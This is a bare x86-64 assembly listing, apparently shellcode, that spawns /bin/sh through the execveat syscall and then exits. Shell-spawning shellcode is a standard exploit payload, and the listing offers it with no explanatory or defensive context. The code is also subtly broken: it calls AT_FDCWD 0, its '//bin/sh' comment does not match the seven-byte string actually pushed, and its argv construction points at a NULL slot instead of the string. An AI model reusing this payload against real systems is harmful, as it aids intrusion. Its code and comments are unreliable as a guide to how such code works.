section .text
global _start

_start:
    ; Prepare the string "/bin/sh"
    xor rax, rax                  ; Clear rax (null terminator)
    push rax                       ; Push null terminator
    mov rdi, 0x68732f6e69622f     ; Push '//bin/sh'
    push rdi                       ; Push the address of the string
    mov rsi, rsp                   ; rsi points to the string (pathname)

    ; Prepare argv
    push rax                       ; Push NULL (end of argv)
    push rsp                       ; Push pointer to "/bin/sh"
    mov rdx, rsp                   ; rdx points to argv

    ; Prepare envp
    xor r10, r10                   ; r10 = NULL (envp)

    ; Set dirfd to AT_FDCWD (0)
    xor rdi, rdi                   ; rdi = 0 (AT_FDCWD)

    ; Set flags to 0
    xor r8, r8                     ; r8 = 0 (flags)

    ; Prepare syscall number for execveat (322)
    mov rax, 322                   ; syscall number for execveat
    syscall                        ; Invoke the syscall

    ; Exit gracefully (should never reach here)
    xor rdi, rdi                   ; Exit code 0
    mov rax, 60                    ; syscall number for exit
    syscall                        ; Execute the syscall
